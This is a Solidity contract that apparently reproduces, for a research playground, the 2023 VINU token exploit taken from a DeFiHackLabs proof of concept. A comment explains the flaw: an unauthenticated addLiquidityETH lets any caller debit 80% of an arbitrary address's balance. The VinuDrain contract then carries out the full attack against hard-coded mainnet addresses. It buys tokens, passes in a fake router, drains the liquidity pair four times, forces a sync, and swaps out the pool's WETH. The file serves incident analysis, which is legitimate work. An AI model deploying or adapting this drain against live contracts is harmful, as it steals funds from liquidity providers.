// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-VINU).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `VinuTest is Test` contract: testExploit() does everything itself
// (attacker = address(this)), and it deploys a small helper `Router` stub
// contract via `new`. This contract is a faithful, self-contained copy of
// that inline attack (testExploit body -> run(); Router stub copied
// verbatim) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/VINU_exp.sol.
//
// Root cause: VINU.addLiquidityETH(routeraddr, lpraddr, devaddr) is a public,
// unauthenticated function that unconditionally debits 80% of `_balances[devaddr]`
// (any address the caller names) and credits the token contract itself, then
// calls out to a caller-supplied `routeraddr` for the (fake) "add liquidity"
// step. By naming the VINU/WETH pair as `devaddr` and supplying a no-op fake
// router, the attacker rips 80% of the pair's OWN VINU balance out on every
// call with no corresponding WETH ever leaving the pair. Four calls leave only
// 0.2^4 = 0.16% of the pair's original VINU. A follow-up permissionless
// `Pair.sync()` forces the pair's cached reserves down to match the gutted
// balance, collapsing the constant-product invariant. The attacker then sells
// the VINU it bought earlier (before the drain) back into the pair at the
// now-catastrophically-mispriced rate, extracting almost the entire WETH side.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IVINU is IERC20 {
    function addLiquidityETH(address routerAddr, address lprAddr, address devAddr) external;
}

interface IUniRouterV2 {
    function WETH() external view returns (address);
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut);
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract VinuDrain {
    IVINU internal constant VINU = IVINU(0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2);
    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniRouterV2 internal constant UniswapV2Router02 = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniPairV2 internal constant Pair = IUniPairV2(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8);
    address private constant flashbotsAddress = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;

    // Accepts the ETH forwarded by the setup step (mirrors deal(address(this), ...)
    // in the original inline test, where address(this) IS the exploit contract) and
    // any ETH the router/pair might return.
    receive() external payable {}

    function run() external {
        // Step 1: buy ammo — 0.1 ETH of VINU via the REAL Uniswap router.
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(VINU);
        UniswapV2Router02.swapExactETHForTokens{value: 0.1 ether}(0, path, address(this), block.timestamp + 100);

        // Step 2: deploy a fake "router" stub — its calls are all no-ops, so only
        // the unauthenticated balance debit inside addLiquidityETH takes effect.
        Router fakeRouter = new Router();

        // Step 3: drain 80% of the PAIR's own VINU balance, four times in a row
        // (devAddr = Pair). 0.2^4 = 0.16% of the pair's VINU survives.
        for (uint256 i; i < 4; ++i) {
            VINU.addLiquidityETH(address(fakeRouter), address(this), address(Pair));
        }

        // Step 4: force the pair to re-price off its now-gutted raw balance.
        Pair.sync();

        // Step 5: sell the ammo bought in step 1 into the broken pool.
        uint256 amountIn = VINU.balanceOf(address(this));
        VINU.transfer(address(Pair), VINU.balanceOf(address(this)));

        (uint112 reserveWETH, uint112 reserveVINU,) = Pair.getReserves();
        flashbotsAddress.call{value: 0.000000001 ether}("");
        uint256 amountOut = UniswapV2Router02.getAmountOut(amountIn, reserveVINU, reserveWETH);

        Pair.swap(amountOut, 0, address(this), "");
    }
}

// Fake router stub: every call is a no-op returning zero/self. VINU's
// addLiquidityETH() calls out to this instead of the real Uniswap router, so
// the real Uniswap liquidity machinery is never touched — only the
// unauthenticated `_balances[devAddr] -= 80%` line inside VINU has any effect.
contract Router {
    address private constant wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function factory() external view returns (address) {
        return address(this);
    }

    function WETH() external view returns (address) {
        return wethAddr;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function createPair(address, address) external view returns (address) {
        return address(this);
    }

    function addLiquidityETH(address, uint256, uint256, uint256, address, uint256)
        external
        payable
        returns (uint256 amountA, uint256 amountB, uint256 liquidity)
    {
        return (0, 0, 0);
    }
}
